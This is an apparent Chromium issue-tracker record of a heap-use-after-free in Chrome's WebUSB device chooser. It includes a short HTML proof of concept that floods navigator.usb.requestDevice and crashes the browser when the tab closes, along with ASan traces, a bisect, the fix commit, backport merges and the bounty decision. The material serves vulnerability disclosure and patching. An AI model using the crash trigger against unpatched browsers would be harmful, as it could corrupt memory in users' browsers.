# AddressSanitizer: heap-use-after-free on address 0x7da147715900 at pc 0x55baa6985542 bp 0x7ffe146adfd0 sp 0x7ffe146adfc8

| Field | Value |
|-------|-------|
| **Issue ID** | [405292639](https://issues.chromium.org/issues/405292639) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>USB |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | zy...@gmail.com |
| **Assignee** | al...@chromium.org |
| **Created** | 2025-03-21 |
| **Bounty** | $11,000.00 |

## Description

---

### Report description

AddressSanitizer: heap-use-after-free on address 0x7da147715900 at pc 0x55baa6985542 bp 0x7ffe146adfd0 sp 0x7ffe146adfc8

---

### Bug location

#### Where do you want to report your vulnerability?

Chrome VRP – Report security issues affecting the Chrome browser. [See program rules](https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules)

---

### The problem

#### Please describe the technical details of the vulnerability

This crash was found while reproducing <https://issues.chromium.org/issues/40074794>.

`AddressSanitizer: heap-use-after-free on address 0x7da147715900 at pc 0x55baa6985542 bp 0x7ffe146adfd0 sp 0x7ffe146adfc8`

#### Crash type

browser crash

#### ENV

ubuntu 22.04.1

#### Reproduce steps:

1. open the `poc.html` in chromium-asan

```
<html>
<head>
  <script>
    async function main() {
	
      dev = null;
      await navigator.usb
        .requestDevice({ filters: [] })
        .then((usbDevice) => {
          dev = usbDevice;
          console.log(`Product name: ${usbDevice.productName}`);
		  for (var i=1;i<10000;i++){
				navigator.usb
				.requestDevice({ filters: [] })
				.then((usbDevice) => {
			});
		}
    });
      
	}
  </script>
</head>
<body>
  <button onclick="main()">click me</button>
</body>
</html>

```

2. click button `click me` and select a device, then click `connect`
3. Try close the tab, then UAF

#### Please briefly explain who can exploit the vulnerability, and what they gain when doing so

I'm not sure if we can exploit it.

---

### The cause

#### What version of Chrome have you found the security issue in?

136.0.7079.0 chromium-asan-linux

#### Is the security issue related to a crash?

Yes, it is related to a crash.

#### Choose the type of vulnerability

Memory Corruption (in a sandboxed processs)

#### How would you like to be publicly acknowledged for your report?

retsew0x01

## Attachments

- [asan.txt](attachments/asan.txt) (text/plain, 11.5 KB)
- [poc.html](attachments/poc.html) (text/html, 493 B)
- [asan.log](attachments/asan.log) (text/plain, 19.4 KB)

## Timeline

### sr...@google.com (2025-03-21)

I was able to reproduce the crash on origin/main:

```
==2435984==ERROR: AddressSanitizer: heap-use-after-free on address 0x7d80fca57900 at pc 0x55e9d85958b6 bp 0x7ffc9e486590 sp 0x7ffc9e486588
READ of size 8 at 0x7d80fca57900 thread T0 (chrome)
    #0 0x55e9d85958b5 in UsbChooserController::DisplayDevice(device::mojom::UsbDeviceInfo const&) const chrome/browser/usb/usb_chooser_controller.cc:285:28
    #1 0x55e9d8592945 in UsbChooserController::GotUsbDeviceList(std::__Cr::vector<mojo::StructPtr<device::mojom::UsbDeviceInfo>, std::__Cr::allocator<mojo::StructPtr<device::mojom::UsbDeviceInfo>>>) chrome/browser/usb/usb_chooser_controller.cc:252:9
    #2 0x55e9d85968d1 in void base::internal::DecayedFunctorTraits<void (UsbChooserController::*)(std::__Cr::vector<mojo::StructPtr<device::mojom::UsbDeviceInfo>, std::__Cr::allocator<mojo::StructPtr<device::mojom::UsbDeviceInfo>>>), base::WeakPtr<UsbChooserController>&&>::Invoke<void (UsbChooserController::*)(std::__Cr::vector<mojo::StructPtr<device::mojom::UsbDeviceInfo>, std::__Cr::allocator<mojo::StructPtr<device::mojom::UsbDeviceInfo>>>), base::WeakPtr<UsbChooserController> const&, std::__Cr::vector<mojo::StructPtr<device::mojom::UsbDeviceInfo>, std::__Cr::allocator<mojo::StructPtr<device::mojom::UsbDeviceInfo>>>>(void (UsbChooserController::*)(std::__Cr::vector<mojo::StructPtr<device::mojom::UsbDeviceInfo>, std::__Cr::allocator<mojo::StructPtr<device::mojom::UsbDeviceInfo>>>), base::WeakPtr<UsbChooserController> const&, std::__Cr::vector<mojo::StructPtr<device::mojom::UsbDeviceInfo>, std::__Cr::allocator<mojo::StructPtr<device::mojom::UsbDeviceInfo>>>&&) base/functional/bind_internal.h:731:12
[...]

0x7d80fca57900 is located 0 bytes inside of 5832-byte region [0x7d80fca57900,0x7d80fca58fc8)
freed by thread T0 (chrome) here:
    #0 0x55e9c42b96fd in operator delete(void*) /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_new_delete.cpp:143:3
    #1 0x55e9d0747084 in operator() third_party/libc++/src/include/__memory/unique_ptr.h:76:5
    #2 0x55e9d0747084 in reset third_party/libc++/src/include/__memory/unique_ptr.h:287:7
    #3 0x55e9d0747084 in ~unique_ptr third_party/libc++/src/include/__memory/unique_ptr.h:256:71
    #4 0x55e9d0747084 in content::RenderFrameHostManager::~RenderFrameHostManager() content/browser/renderer_host/render_frame_host_manager.cc:621:3
    #5 0x55e9d030ce4a in content::FrameTreeNode::~FrameTreeNode() content/browser/renderer_host/frame_tree_node.cc:324:1
    #6 0x55e9d02f2d1b in content::FrameTree::~FrameTree() content/browser/renderer_host/frame_tree.cc:231:1
    #7 0x55e9d0e39fe4 in content::WebContentsImpl::~WebContentsImpl() content/browser/web_contents/web_contents_impl.cc:1502:1
[...]
```

### sr...@google.com (2025-03-21)

I reproduced this back to M134.
For the OS, I'm setting it tentatively to all platforms besides iOS. alvinji@ can you please update this as you see fit?

### ch...@google.com (2025-03-22)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2025-03-22)

Setting Priority to P1 to match Severity s1. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### zy...@gmail.com (2025-03-24)

#### Bisect

It seems that this commit introduced this bug: <https://source.chromium.org/chromium/chromium/src/+/0e45c020c43b1a9f6d2870ff7f92b30a2f03a458>, which changed `requesting_frame_` to `raw_ptr`.

#### patch diff(use weak\_ptr, maybe not correct)

chrome/browser/usb/usb\_chooser\_controller.h

```
-   const raw_ptr<content::RenderFrameHost, AcrossTasksDanglingUntriaged>
      requesting_frame_;
+  std::weak_ptr<content::RenderFrameHost>
       requesting_frame_;

```

chrome/browser/usb/usb\_chooser\_controller.cc

```
+  auto requesting_frame = requesting_frame_.lock(); 
+  if (requesting_frame) {  
     if (base::FeatureList::IsEnabled(blink::features::kUnrestrictedUsb)) {
       is_usb_unrestricted =
           requesting_frame_ &&
           requesting_frame_->IsFeatureEnabled(
               network::mojom::PermissionsPolicyFeature::kUsbUnrestricted) &&
        content::HasIsolatedContextCapability(requesting_frame_);

```

### ch...@google.com (2025-04-05)

alvinji: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### ch...@google.com (2025-04-06)

alvinji: Uh oh! This issue still open and hasn't been updated in the last 15 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### al...@google.com (2025-04-07)

It looks like the queued navigator.usb.requestDevice trigger UAF when the UsbChooserController::DisplayDevice are run after 'requesting\_frame\_' has been destroyed. I will investigate further how to avoid this from happening.  

Thanks!

### dx...@google.com (2025-04-08)

Project: chromium/src  

Branch: main  

Author: Alvin Ji [alvinji@chromium.org](mailto:alvinji@chromium.org)  

Link:      <https://chromium-review.googlesource.com/6440254>

usb: Use GlobalRenderFrameHostId in UsbChooserController

---


Expand for full commit details
```
     
    The UsbChooserController currently holds a raw pointer to the requesting 
    RenderFrameHost. This can lead to use-after-free issues if the 
    RenderFrameHost is destroyed before the chooser controller. This CL 
    replaces the raw pointer with a `GlobalRenderFrameHostId`. This ID can 
    be used to retrieve the RenderFrameHost when needed, and checks are 
    added to ensure the RenderFrameHost is still valid before accessing it. 
     
    Bug: 405292639 
    Change-Id: Ifedaf80f6700d57ea28691abfaf4d2ff9cdbb448 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6440254 
    Commit-Queue: Alvin Ji <alvinji@chromium.org> 
    Reviewed-by: Matt Reynolds <mattreynolds@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1444224}

```

---

Files:

- M `chrome/browser/usb/usb_chooser_controller.cc`
- M `chrome/browser/usb/usb_chooser_controller.h`

---

Hash: 0333ecde91425e518cd898614c7b018209a18511  

Date:  Tue Apr 8 17:46:18 2025


---

### al...@chromium.org (2025-04-08)

I verified the fix ([crrev.com/c/6440254](https://crrev.com/c/6440254)) locally with "poc.html" and don't see crash triggered on ASAN build now.  

I'll mark the issue as fixed.

### ch...@google.com (2025-04-09)

Security Merge Request Consideration: This is sufficiently serious that it should be merged to extended stable. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M134. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request Consideration: This is sufficiently serious that it should be merged to stable. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M135. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request Consideration: This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M136. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request - Manual Review: Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Security Merge Request - Manual Review: Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Security Merge Request - Manual Review: Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [134, 135, 136].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### al...@chromium.org (2025-04-09)

Please answer the following questions so that we can safely process this merge request:

Which CLs should be backmerged? crrev.com/c/6440254
Has this fix been verified on Canary to not pose any stability regressions? Yes
Does this fix pose any potential non-verifiable stability risks? No
Does this fix pose any known compatibility risks? No
Does it require manual verification by the test team? If so, please describe required testing. No
(no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### am...@chromium.org (2025-04-10)

merges approved for <https://crrev.com/c/6440254>
please merge this fix to:

- M136 Beta / branch 7103
- M135 Stable / branch 7049
- M136 Extended / branch 6998

by EOD tomorrow, Friday, 11 April, so this fix can be included in next week's updates

### dx...@google.com (2025-04-11)

Project: chromium/src  

Branch: refs/branch-heads/7103  

Author: Alvin Ji [alvinji@chromium.org](mailto:alvinji@chromium.org)  

Link:      <https://chromium-review.googlesource.com/6449681>

usb: Use GlobalRenderFrameHostId in UsbChooserController

---


Expand for full commit details
```
     
    The UsbChooserController currently holds a raw pointer to the requesting 
    RenderFrameHost. This can lead to use-after-free issues if the 
    RenderFrameHost is destroyed before the chooser controller. This CL 
    replaces the raw pointer with a `GlobalRenderFrameHostId`. This ID can 
    be used to retrieve the RenderFrameHost when needed, and checks are 
    added to ensure the RenderFrameHost is still valid before accessing it. 
     
    (cherry picked from commit 0333ecde91425e518cd898614c7b018209a18511) 
     
    Bug: 405292639 
    Change-Id: Ifedaf80f6700d57ea28691abfaf4d2ff9cdbb448 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6440254 
    Commit-Queue: Alvin Ji <alvinji@chromium.org> 
    Reviewed-by: Matt Reynolds <mattreynolds@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1444224} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6449681 
    Cr-Commit-Position: refs/branch-heads/7103@{#650} 
    Cr-Branched-From: e09430c64983fc906f37a9f7e6806275c9b67b86-refs/heads/main@{#1440670}

```

---

Files:

- M `chrome/browser/usb/usb_chooser_controller.cc`
- M `chrome/browser/usb/usb_chooser_controller.h`

---

Hash: 1ca0bee6da47c552c0d583699b41f50be9a4cede  

Date:  Fri Apr 11 01:02:37 2025


---

### dx...@google.com (2025-04-11)

Project: chromium/src  

Branch: refs/branch-heads/6998  

Author: Alvin Ji [alvinji@chromium.org](mailto:alvinji@chromium.org)  

Link:      <https://chromium-review.googlesource.com/6449584>

usb: Use GlobalRenderFrameHostId in UsbChooserController

---


Expand for full commit details
```
     
    The UsbChooserController currently holds a raw pointer to the requesting 
    RenderFrameHost. This can lead to use-after-free issues if the 
    RenderFrameHost is destroyed before the chooser controller. This CL 
    replaces the raw pointer with a `GlobalRenderFrameHostId`. This ID can 
    be used to retrieve the RenderFrameHost when needed, and checks are 
    added to ensure the RenderFrameHost is still valid before accessing it. 
     
    (cherry picked from commit 0333ecde91425e518cd898614c7b018209a18511) 
     
    Bug: 405292639 
    Change-Id: Ifedaf80f6700d57ea28691abfaf4d2ff9cdbb448 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6440254 
    Commit-Queue: Alvin Ji <alvinji@chromium.org> 
    Reviewed-by: Matt Reynolds <mattreynolds@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1444224} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6449584 
    Cr-Commit-Position: refs/branch-heads/6998@{#3160} 
    Cr-Branched-From: de9c6fafd8ae5c6ea0438764076ca7d04a0b165d-refs/heads/main@{#1415337}

```

---

Files:

- M `chrome/browser/usb/usb_chooser_controller.cc`
- M `chrome/browser/usb/usb_chooser_controller.h`

---

Hash: 01a75dcf1244efdd35eadfcc5ad94650c5bc70d4  

Date:  Fri Apr 11 01:03:07 2025


---

### pe...@google.com (2025-04-11)

LTS Milestone M132

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### dx...@google.com (2025-04-11)

Project: chromium/src  

Branch: refs/branch-heads/7049  

Author: Alvin Ji [alvinji@chromium.org](mailto:alvinji@chromium.org)  

Link:      <https://chromium-review.googlesource.com/6447963>

usb: Use GlobalRenderFrameHostId in UsbChooserController

---


Expand for full commit details
```
     
    The UsbChooserController currently holds a raw pointer to the requesting 
    RenderFrameHost. This can lead to use-after-free issues if the 
    RenderFrameHost is destroyed before the chooser controller. This CL 
    replaces the raw pointer with a `GlobalRenderFrameHostId`. This ID can 
    be used to retrieve the RenderFrameHost when needed, and checks are 
    added to ensure the RenderFrameHost is still valid before accessing it. 
     
    (cherry picked from commit 0333ecde91425e518cd898614c7b018209a18511) 
     
    Bug: 405292639 
    Change-Id: Ifedaf80f6700d57ea28691abfaf4d2ff9cdbb448 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6440254 
    Commit-Queue: Alvin Ji <alvinji@chromium.org> 
    Reviewed-by: Matt Reynolds <mattreynolds@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1444224} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6447963 
    Cr-Commit-Position: refs/branch-heads/7049@{#1809} 
    Cr-Branched-From: 2dab7846d0951a552bdc4f350dad497f986e6fed-refs/heads/main@{#1427262}

```

---

Files:

- M `chrome/browser/usb/usb_chooser_controller.cc`
- M `chrome/browser/usb/usb_chooser_controller.h`

---

Hash: 436bb205317b16680c7d631733a9a9c191058c68  

Date:  Fri Apr 11 01:14:09 2025


---

### pe...@google.com (2025-04-14)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### qk...@google.com (2025-04-15)

1. https://chromium-review.googlesource.com/c/chromium/src/+/6450383
2. Medium - There were a couple of conflicts.
3. 134, 135, and 136
4. Yes. According to comment #9,  the queued navigator.usb.requestDevice trigger UAF when the UsbChooserController::DisplayDevice are run after 'requesting_frame_' has been destroyed. But, like other milestones, the UsbChooserController still holds a raw pointer to the requesting RenderFrameHost in M132. Thus, I think we need to merge the fix to M132.

### sp...@google.com (2025-04-18)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $11000.00 for this report.

Rationale for this decision:
$10,000 for report of mildly mitigated memory corruption in a sandboxed process + $1,000 bisect bonus


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### am...@chromium.org (2025-04-18)

Congratulations retsew0x01! We consider this issue to be mildly mitigated based on the permissions preconditions to grant access for the USB device + the mild user gesture required to trigger this issue. Thank you for your efforts and reporting this issue to us -- nice work.

### zy...@gmail.com (2025-04-20)

Thanks so much, Amy!

### dx...@google.com (2025-04-24)

Project: chromium/src  

Branch: refs/branch-heads/6834  

Author: Alvin Ji [alvinji@chromium.org](mailto:alvinji@chromium.org)  

Link:      <https://chromium-review.googlesource.com/6450383>

[M132-LTS] usb: Use GlobalRenderFrameHostId in UsbChooserController

---


Expand for full commit details
```
     
    The UsbChooserController currently holds a raw pointer to the requesting 
    RenderFrameHost. This can lead to use-after-free issues if the 
    RenderFrameHost is destroyed before the chooser controller. This CL 
    replaces the raw pointer with a `GlobalRenderFrameHostId`. This ID can 
    be used to retrieve the RenderFrameHost when needed, and checks are 
    added to ensure the RenderFrameHost is still valid before accessing it. 
     
    (cherry picked from commit 0333ecde91425e518cd898614c7b018209a18511) 
     
    Bug: 405292639 
    Change-Id: Ifedaf80f6700d57ea28691abfaf4d2ff9cdbb448 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6440254 
    Commit-Queue: Alvin Ji <alvinji@chromium.org> 
    Reviewed-by: Matt Reynolds <mattreynolds@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1444224} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6450383 
    Reviewed-by: Alvin Ji <alvinji@chromium.org> 
    Reviewed-by: Mohamed Omar <mohamedaomar@google.com> 
    Owners-Override: Mohamed Omar <mohamedaomar@google.com> 
    Commit-Queue: Gyuyoung Kim (xWF) <qkim@google.com> 
    Cr-Commit-Position: refs/branch-heads/6834@{#5555} 
    Cr-Branched-From: 47a3549fac11ee8cb7be6606001ede605b302b9f-refs/heads/main@{#1381561}

```

---

Files:

- M `chrome/browser/usb/usb_chooser_controller.cc`
- M `chrome/browser/usb/usb_chooser_controller.h`

---

Hash: 1b0a64d3da587531cc4c00fe72acb7a017e69c42  

Date:  Thu Apr 24 08:01:02 2025


---

### dx...@google.com (2025-05-29)

Project: chromium/src  

Branch: refs/branch-heads/6834\_160  

Author: Alvin Ji [alvinji@chromium.org](mailto:alvinji@chromium.org)  

Link:      <https://chromium-review.googlesource.com/6604447>

[CfM-R132] [M132-LTS] usb: Use GlobalRenderFrameHostId in UsbChooserController

---


Expand for full commit details
```
     
    The UsbChooserController currently holds a raw pointer to the requesting 
    RenderFrameHost. This can lead to use-after-free issues if the 
    RenderFrameHost is destroyed before the chooser controller. This CL 
    replaces the raw pointer with a `GlobalRenderFrameHostId`. This ID can 
    be used to retrieve the RenderFrameHost when needed, and checks are 
    added to ensure the RenderFrameHost is still valid before accessing it. 
     
    (cherry picked from commit 0333ecde91425e518cd898614c7b018209a18511) 
     
    (cherry picked from commit 1b0a64d3da587531cc4c00fe72acb7a017e69c42) 
     
    Bug: 405292639 
    Change-Id: Ifedaf80f6700d57ea28691abfaf4d2ff9cdbb448 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6440254 
    Commit-Queue: Alvin Ji <alvinji@chromium.org> 
    Reviewed-by: Matt Reynolds <mattreynolds@chromium.org> 
    Cr-Original-Original-Commit-Position: refs/heads/main@{#1444224} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6450383 
    Reviewed-by: Alvin Ji <alvinji@chromium.org> 
    Reviewed-by: Mohamed Omar <mohamedaomar@google.com> 
    Owners-Override: Mohamed Omar <mohamedaomar@google.com> 
    Commit-Queue: Gyuyoung Kim (xWF) <qkim@google.com> 
    Cr-Original-Commit-Position: refs/branch-heads/6834@{#5555} 
    Cr-Original-Branched-From: 47a3549fac11ee8cb7be6606001ede605b302b9f-refs/heads/main@{#1381561} 
    Signed-off-by: Kyle Williams <kdgwill@google.com> 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6604447 
    Owners-Override: Kyle Williams <kdgwill@chromium.org> 
    Commit-Queue: Kyle Williams <kdgwill@chromium.org> 
    Reviewed-by: Niko Tsirakis <ntsirakis@google.com> 
    Auto-Submit: Kyle Williams <kdgwill@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/6834_160@{#76} 
    Cr-Branched-From: cdae089eab830291f81deb011febbbdc520a019e-refs/branch-heads/6834@{#4409} 
    Cr-Branched-From: 47a3549fac11ee8cb7be6606001ede605b302b9f-refs/heads/main@{#1381561}

```

---

Files:

- M `chrome/browser/usb/usb_chooser_controller.cc`
- M `chrome/browser/usb/usb_chooser_controller.h`

---

Hash: c5bcfa02850e7cbd15ca4a061ba80991f3cae0c8  

Date:  Thu May 29 20:20:51 2025


---

### ch...@google.com (2025-07-16)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

## Bounty Award

> $10,000 for report of mildly mitigated memory corruption in a sandboxed process + $1,000 bisect bonus

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/405292639)*
